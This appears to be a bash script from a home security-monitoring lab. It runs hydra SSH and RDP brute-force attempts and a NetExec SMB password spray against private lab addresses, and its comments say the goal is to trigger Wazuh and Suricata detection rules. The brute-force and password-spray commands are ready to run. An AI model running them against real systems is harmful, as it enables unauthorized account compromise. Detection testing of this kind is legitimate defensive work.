#!/usr/bin/env bash
# Brute-force emulation from the ATTACKER VLAN (Kali, 10.10.99.10) against the
# ENTERPRISE VLAN. Generates 4625 storms (Windows) / auth.log failures (Linux) to
# validate Wazuh rules 100200->100201 (Win) and 5720->100210 (SSH), plus Suricata
# sid:9000002 (SMB spray).
#
# ONLY against your own lab. These IPs match docs/network-segmentation.md.
set -uo pipefail

LNX01=10.10.20.50
WKS01=10.10.20.101
ENTERPRISE=10.10.20.0/24

banner() { echo; echo "== $* =="; }

banner "SSH brute force -> LNX01 (expect rule 100210 on success-after-brute)"
# rockyou is huge; head it so the run finishes and STILL trips the >10-fails threshold.
head -n 50 /usr/share/wordlists/rockyou.txt > /tmp/wl.txt
hydra -l admin -P /tmp/wl.txt -t 4 -f "ssh://${LNX01}" || true

banner "RDP brute force -> WKS01 (expect Windows 4625 storm -> rule 100200)"
hydra -t 4 -V -l Administrator -P /tmp/wl.txt "rdp://${WKS01}" || true

banner "SMB spray -> enterprise /24 (expect Suricata sid:9000002 + 4625s)"
# NetExec (nxc) — the maintained CrackMapExec successor.
if command -v nxc >/dev/null 2>&1; then
  echo -e "Administrator\nadmin\nsvc_backup" > /tmp/users.txt
  nxc smb "${ENTERPRISE}" -u /tmp/users.txt -p 'Spring2026!' || true
else
  echo "nxc not installed (pipx install netexec) — skipping SMB spray."
fi

banner "Done"
echo "Check the Wazuh dashboard: rule.id 100200/100201/100210 and the Suricata alerts."
echo "Then work the resulting alert as a case in TheHive (response/runbooks/bruteforce.md)."
